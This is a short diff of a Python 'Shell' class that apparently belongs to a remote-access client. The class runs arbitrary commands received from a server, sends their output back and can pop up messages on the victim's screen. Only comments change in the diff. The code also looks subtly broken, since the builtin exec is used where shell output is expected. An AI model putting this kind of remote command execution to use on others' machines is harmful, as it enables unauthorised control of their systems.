@@ -18,7 +18,7 @@ class Shell:
 
     def exec(self, data: str) -> str:
         '''
-        Executes commands on remote client's shell
+        Executes commands on shell and returns output string
         
         :param data: Command to send over to client
         '''
@@ -51,15 +51,15 @@ class Shell:
                 if data[:2] == "cd": # Changes directory
                     os.chdir(data[3:])
                     
-                if len(data) > 0: # Executes command
+                if len(data) > 0:
                     # Custom functions
                     
                     # Send a pop-up notification to client
                     if data[:6] == "notify":
                         output_str = exec("msg %username% {}".format(data[7:]))
                     
+                    # Executes arbitrary command
                     else:
-                        # Executes command
                         output_str = exec(data)
                     
                     #Sends output back to server
